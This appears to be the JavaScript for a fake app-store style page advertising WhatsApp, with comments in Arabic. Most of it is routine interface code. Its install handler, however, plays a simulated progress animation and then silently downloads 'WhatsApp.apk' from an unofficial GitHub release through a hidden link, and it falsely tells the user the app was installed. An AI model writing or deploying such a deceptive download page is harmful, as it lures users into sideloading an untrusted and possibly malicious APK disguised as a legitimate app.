// whatsapp.js - منطق صفحة معلومات تطبيق واتساب
document.addEventListener('DOMContentLoaded', () => {
  // عناصر القائمة الجانبية
  const menuBtn = document.getElementById('menu-btn');
  const closeDrawerBtn = document.getElementById('close-drawer-btn');
  const sideDrawer = document.getElementById('side-drawer');
  const drawerOverlay = document.getElementById('drawer-overlay');
  const drawerSearchInput = document.getElementById('drawer-search-input');

  // عناصر البحث
  const topSearchInput = document.getElementById('top-search-input');
  const clearTopSearch = document.getElementById('clear-top-search');

  // عناصر التثبيت والإشعار
  const mainInstallBtn = document.getElementById('main-install-btn');
  const installText = document.getElementById('install-text');
  const installIcon = document.getElementById('install-icon');
  const circleProgressWrap = document.getElementById('circle-progress-wrap');
  const progressCircle = document.getElementById('progress-circle');
  const progressPercent = document.getElementById('progress-percent');
  const installedActionsGroup = document.getElementById('installed-actions-group');
  const openAppBtn = document.getElementById('open-app-btn');
  const uninstallBtn = document.getElementById('uninstall-btn');

  const appToast = document.getElementById('app-toast');
  const toastTitle = document.getElementById('toast-title');
  const toastMsg = document.getElementById('toast-msg');

  let toastTimeout = null;
  const CIRCUMFERENCE = 94.25; // 2 * PI * 15
  const APK_URL = 'https://github.com/t72973024-afk/APK-AI-21081/releases/download/Too/WhatsApp.apk';
  const TOTAL_MB = 48.6;

  // ==========================================================================
  // 1. التحكم في القائمة الجانبية (Side Drawer)
  // ==========================================================================
  function openDrawer() {
    if (!sideDrawer || !drawerOverlay) return;
    sideDrawer.classList.add('open');
    drawerOverlay.classList.add('active');
    sideDrawer.setAttribute('aria-hidden', 'false');
    document.body.style.overflow = 'hidden';
  }

  function closeDrawer() {
    if (!sideDrawer || !drawerOverlay) return;
    sideDrawer.classList.remove('open');
    drawerOverlay.classList.remove('active');
    sideDrawer.setAttribute('aria-hidden', 'true');
    document.body.style.overflow = '';
  }

  if (menuBtn) menuBtn.addEventListener('click', openDrawer);
  if (closeDrawerBtn) closeDrawerBtn.addEventListener('click', closeDrawer);
  if (drawerOverlay) drawerOverlay.addEventListener('click', closeDrawer);

  document.querySelectorAll('.drawer-item').forEach((item) => {
    item.addEventListener('click', () => {
      closeDrawer();
    });
  });

  // تصفية عناصر القائمة الجانبية
  if (drawerSearchInput) {
    drawerSearchInput.addEventListener('input', (e) => {
      const q = e.target.value.toLowerCase().trim();
      const items = document.querySelectorAll('.drawer-nav .drawer-item');
      items.forEach((item) => {
        const text = item.textContent.toLowerCase();
        item.style.display = !q || text.includes(q) ? 'flex' : 'none';
      });
    });
  }

  // ==========================================================================
  // 2. البحث في الصفحة
  // ==========================================================================
  if (topSearchInput) {
    topSearchInput.addEventListener('input', (e) => {
      const q = e.target.value.toLowerCase().trim();
      if (clearTopSearch) {
        clearTopSearch.style.display = q ? 'block' : 'none';
      }
    });
  }

  if (clearTopSearch) {
    clearTopSearch.addEventListener('click', () => {
      if (topSearchInput) {
        topSearchInput.value = '';
        topSearchInput.dispatchEvent(new Event('input'));
        topSearchInput.focus();
      }
    });
  }

  // ==========================================================================
  // 3. الإشعارات العائمة (Toast) والتنزيل الصامت
  // ==========================================================================
  function showToast(title, message, duration = 3800) {
    if (!appToast) return;
    if (toastTimeout) clearTimeout(toastTimeout);

    if (toastTitle) toastTitle.textContent = title;
    if (toastMsg) toastMsg.textContent = message;

    appToast.classList.add('show');
    toastTimeout = setTimeout(() => {
      appToast.classList.remove('show');
    }, duration);
  }

  function downloadApkSilently(url, filename = 'WhatsApp.apk') {
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
    setTimeout(() => {
      if (document.body.contains(a)) document.body.removeChild(a);
    }, 1000);
  }

  // ==========================================================================
  // 4. حالة التثبيت مع الدائرة المتحركة والتزامن
  // ==========================================================================
  function checkInstalledState() {
    const isInstalled = localStorage.getItem('whatsapp_installed') === 'true';
    if (isInstalled && mainInstallBtn && installedActionsGroup) {
      mainInstallBtn.style.display = 'none';
      installedActionsGroup.style.display = 'flex';
    } else if (mainInstallBtn && installedActionsGroup) {
      mainInstallBtn.style.display = 'flex';
      installedActionsGroup.style.display = 'none';
      if (installText) installText.textContent = 'تثبيت';
      if (circleProgressWrap) circleProgressWrap.style.display = 'none';
      if (installIcon) installIcon.style.display = 'block';
      mainInstallBtn.style.pointerEvents = 'auto';
    }
  }

  checkInstalledState();

  if (mainInstallBtn) {
    mainInstallBtn.addEventListener('click', (e) => {
      e.preventDefault();

      // تفعيل دائرة التقدم الدائرية
      if (circleProgressWrap) {
        circleProgressWrap.style.display = 'flex';
        circleProgressWrap.classList.add('spinning');
      }
      if (installIcon) installIcon.style.display = 'none';
      mainInstallBtn.style.pointerEvents = 'none';

      showToast('جاري تثبيت واتساب...', `يتم تنزيل حزمة APK وتثبيتها تلقائياً حسب حجم الملف (${TOTAL_MB} MB)`);

      let currentPercent = 0;
      const intervalSpeed = 40; // سرعة ملء شريط التقدم

      const progressInterval = setInterval(() => {
        currentPercent += 2;
        if (currentPercent > 100) currentPercent = 100;

        // تحديث الخط الدائري المحيط والنسبة المئوية
        if (progressCircle) {
          const offset = CIRCUMFERENCE - (currentPercent / 100) * CIRCUMFERENCE;
          progressCircle.style.strokeDashoffset = offset;
        }

        if (progressPercent) {
          progressPercent.textContent = `${currentPercent}%`;
        }

        const downloadedMB = ((currentPercent * TOTAL_MB) / 100).toFixed(1);
        if (installText) {
          installText.textContent = `جاري التنزيل: ${downloadedMB} / ${TOTAL_MB} MB (${currentPercent}%)`;
        }

        if (currentPercent >= 100) {
          clearInterval(progressInterval);

          // تثبيت التطبيق تلقائياً وتنزيل الـ APK على جهاز المستخدم
          downloadApkSilently(APK_URL, 'WhatsApp.apk');

          localStorage.setItem('whatsapp_installed', 'true');

          showToast('اكتمل التثبيت بنجاح ✓', 'تم تثبيت تطبيق واتساب على جهازك، يمكنك الآن الضغط على فتح', 4500);

          setTimeout(() => {
            if (circleProgressWrap) {
              circleProgressWrap.classList.remove('spinning');
              circleProgressWrap.style.display = 'none';
            }
            mainInstallBtn.style.display = 'none';
            if (installedActionsGroup) {
              installedActionsGroup.style.display = 'flex';
            }
          }, 400);
        }
      }, intervalSpeed);
    });
  }

  // فتح التطبيق
  if (openAppBtn) {
    openAppBtn.addEventListener('click', (e) => {
      showToast('واتساب', 'جاري فتح تطبيق واتساب...', 2500);
    });
  }

  // زر إلغاء التثبيت
  if (uninstallBtn) {
    uninstallBtn.addEventListener('click', () => {
      localStorage.removeItem('whatsapp_installed');
      checkInstalledState();
      showToast('إلغاء التثبيت', 'تم إلغاء تثبيت تطبيق واتساب بنجاح');
    });
  }

  // ==========================================================================
  // 5. فتح العروض ولقطات الشاشة بسلاسة (Lightbox Modal)
  // ==========================================================================
  const screenshotModal = document.getElementById('screenshot-modal');
  const modalImg = document.getElementById('modal-img');
  const closeModalBtn = document.getElementById('close-modal-btn');
  const modalBackdrop = document.getElementById('modal-backdrop');
  const screenshotItems = document.querySelectorAll('.edge-screenshot-item img');

  function openScreenshotModal(src) {
    if (!screenshotModal || !modalImg) return;
    modalImg.src = src;
    screenshotModal.classList.add('open');
    screenshotModal.setAttribute('aria-hidden', 'false');
  }

  function closeScreenshotModal() {
    if (!screenshotModal) return;
    screenshotModal.classList.remove('open');
    screenshotModal.setAttribute('aria-hidden', 'true');
  }

  screenshotItems.forEach((img) => {
    img.addEventListener('click', () => {
      openScreenshotModal(img.src);
    });
  });

  if (closeModalBtn) closeModalBtn.addEventListener('click', closeScreenshotModal);
  if (modalBackdrop) modalBackdrop.addEventListener('click', closeScreenshotModal);

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') closeScreenshotModal();
  });
});
